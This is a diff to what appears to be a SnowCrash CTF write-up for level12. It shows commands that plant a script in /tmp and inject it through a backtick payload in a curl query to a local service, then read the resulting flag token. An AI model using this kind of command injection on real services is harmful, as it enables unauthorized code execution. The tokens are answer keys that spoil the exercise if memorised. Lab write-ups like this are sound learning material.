@@ -51,8 +51,9 @@ test
 ..level12
 ```
 ```
-level12@SnowCrash:~$ echo 'getflag > /tmp/flag' > /tmp/EXPLOIT
+level12@SnowCrash:~$ echo 'getflag > /tmp/flag12' > /tmp/EXPLOIT
+level12@SnowCrash:~$ chmod +x /tmp/EXPLOIT
 level12@SnowCrash:~$ curl localhost:4646/?x='`/*/EXPLOIT`'
-..level12@SnowCrash:~$ cat /tmp/flag
-Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+..level12@SnowCrash:~$ cat /tmp/flag12
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
 ```
